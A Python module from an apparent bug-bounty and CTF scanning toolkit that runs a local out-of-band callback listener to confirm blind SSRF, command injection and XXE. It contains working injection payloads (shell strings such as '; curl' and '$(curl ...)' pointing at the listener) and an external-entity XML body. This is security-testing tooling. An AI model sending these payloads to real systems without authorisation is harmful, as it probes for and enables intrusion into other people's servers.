"""Out-of-band Application Security Testing (OAST) for blind vulnerabilities.

Blind SSRF, blind RCE, and OOB XXE produce no response signal — the only proof
is the target reaching back out to a server you control. This module runs a
programmatic in-process collaborator: it serves an HTTP listener, hands out
unique callback URLs, and confirms a vulnerability when the target hits one.

Usage:
    from bugbounty_ctf import SecurityScanner
    from bugbounty_ctf.oast import OASTServer, test_blind_ssrf

    scanner = SecurityScanner("http://target/")
    with OASTServer() as oast:
        result = test_blind_ssrf(
            "http://target/fetch", scanner=scanner, oast=oast, param_name="url"
        )
        if result["vulnerable"]:
            print("Blind SSRF confirmed via OOB callback")

For internet-facing targets the listener must be reachable from the target
(bind to a routable interface and/or use a tunnel); against localhost labs the
default 127.0.0.1 bind is enough.
"""

from __future__ import annotations

import secrets
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any, cast

from bugbounty_ctf.engine import SecurityScanner


class _OASTState:
    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.interactions: list[dict[str, Any]] = []


class _OASTHTTPServer(HTTPServer):
    """HTTPServer carrying a shared interaction store for its handlers."""

    state: _OASTState


class _Handler(BaseHTTPRequestHandler):
    def _record(self) -> None:
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length) if length else b""
        record = {
            "method": self.command,
            "path": self.path,
            "source_ip": self.client_address[0],
            "user_agent": self.headers.get("User-Agent", ""),
            "body": body.decode("utf-8", errors="replace")[:500],
            "timestamp": datetime.now().isoformat(),
        }
        server = cast(_OASTHTTPServer, self.server)
        with server.state.lock:
            server.state.interactions.append(record)

    def _respond(self) -> None:
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok\n")

    def do_GET(self) -> None:
        self._record()
        self._respond()

    def do_POST(self) -> None:
        self._record()
        self._respond()

    do_PUT = do_POST
    do_DELETE = do_GET
    do_OPTIONS = do_GET
    do_HEAD = do_GET

    def log_message(self, format: str, *args: Any) -> None:
        # Silence the default stderr access log; interactions are stored instead.
        return


class OASTServer:
    """In-process OOB collaborator that records callbacks per unique token."""

    def __init__(self, host: str = "127.0.0.1", port: int = 0) -> None:
        self.state = _OASTState()
        self._srv = _OASTHTTPServer((host, port), _Handler)
        self._srv.state = self.state
        self.host = host
        # port 0 → an ephemeral port was assigned; read the real one back.
        self.port = self._srv.server_address[1]
        self._thread: threading.Thread | None = None

    def start(self) -> OASTServer:
        self._thread = threading.Thread(target=self._srv.serve_forever, daemon=True)
        self._thread.start()
        return self

    def stop(self) -> None:
        self._srv.shutdown()
        self._srv.server_close()

    def __enter__(self) -> OASTServer:
        return self.start()

    def __exit__(self, *exc: object) -> None:
        self.stop()

    def new_token(self, prefix: str = "oob") -> str:
        """Return a unique, unguessable callback token."""
        return f"{prefix}-{secrets.token_hex(8)}"

    def payload_url(self, token: str, *, scheme: str = "http", path_suffix: str = "") -> str:
        """Build a callback URL embedding the token for a payload to fetch."""
        return f"{scheme}://{self.host}:{self.port}/{token}{path_suffix}"

    def interactions(self, token: str | None = None) -> list[dict[str, Any]]:
        """Return recorded interactions, optionally filtered by token."""
        with self.state.lock:
            items = list(self.state.interactions)
        if token is None:
            return items
        return [i for i in items if token in i["path"] or token in i["body"]]

    def received(self, token: str) -> bool:
        """True if any callback carrying ``token`` has been recorded."""
        return bool(self.interactions(token))

    def wait_for(self, token: str, timeout: float = 5.0, interval: float = 0.2) -> bool:
        """Block up to ``timeout`` seconds for a callback carrying ``token``."""
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if self.received(token):
                return True
            time.sleep(interval)
        return self.received(token)


def _confirm(
    oast: OASTServer,
    token: str,
    payload: str,
    *,
    scanner: SecurityScanner,
    url: str,
    method: str,
    vuln_type: str,
    timeout: float,
) -> dict[str, Any]:
    hit = oast.wait_for(token, timeout=timeout)
    result = {
        "vulnerable": hit,
        "vuln_type": vuln_type,
        "token": token,
        "payload": payload,
        "interactions": oast.interactions(token),
    }
    if hit:
        print(f"[!] {vuln_type.upper()} CONFIRMED via OOB callback: {url}")
        scanner._record_finding(
            url,
            method,
            payload,
            ["oob_callback", vuln_type],
            [f"Target reached the OAST listener for token {token}"],
            vuln_type,
            source="oast",
        )
    return result


def test_blind_ssrf(
    url: str,
    *,
    scanner: SecurityScanner,
    oast: OASTServer,
    param_name: str = "url",
    method: str = "POST",
    timeout: float = 5.0,
) -> dict[str, Any]:
    """Confirm blind SSRF: inject a callback URL and wait for the target to fetch it."""
    token = oast.new_token("ssrf")
    payload = oast.payload_url(token)
    is_post = method.upper() in ("POST", "PUT", "PATCH")
    if is_post:
        scanner._make_request(method, url, data={param_name: payload})
    else:
        scanner._make_request(method, url, params={param_name: payload})
    return _confirm(
        oast,
        token,
        payload,
        scanner=scanner,
        url=url,
        method=method,
        vuln_type="blind_ssrf",
        timeout=timeout,
    )


def test_blind_rce(
    url: str,
    *,
    scanner: SecurityScanner,
    oast: OASTServer,
    param_name: str = "input",
    method: str = "GET",
    timeout: float = 6.0,
) -> dict[str, Any]:
    """Confirm blind command injection via an OOB HTTP callback (curl/wget)."""
    token = oast.new_token("rce")
    callback = oast.payload_url(token)
    payloads = [
        f"; curl {callback}",
        f"| curl {callback}",
        f"$(curl {callback})",
        f"; wget -q -O- {callback}",
        f"`curl {callback}`",
    ]
    is_post = method.upper() in ("POST", "PUT", "PATCH")
    for payload in payloads:
        if is_post:
            scanner._make_request(method, url, data={param_name: payload})
        else:
            scanner._make_request(method, url, params={param_name: payload})
    return _confirm(
        oast,
        token,
        "; curl <oast>",
        scanner=scanner,
        url=url,
        method=method,
        vuln_type="blind_rce",
        timeout=timeout,
    )


def test_blind_xxe(
    url: str,
    *,
    scanner: SecurityScanner,
    oast: OASTServer,
    method: str = "POST",
    timeout: float = 5.0,
) -> dict[str, Any]:
    """Confirm OOB XXE: an external entity that forces the parser to call back."""
    token = oast.new_token("xxe")
    callback = oast.payload_url(token)
    body = (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{callback}">]>\n'
        "<root>&xxe;</root>"
    )
    scanner._make_request(method, url, data=body, headers={"Content-Type": "application/xml"})
    return _confirm(
        oast,
        token,
        body,
        scanner=scanner,
        url=url,
        method=method,
        vuln_type="blind_xxe",
        timeout=timeout,
    )
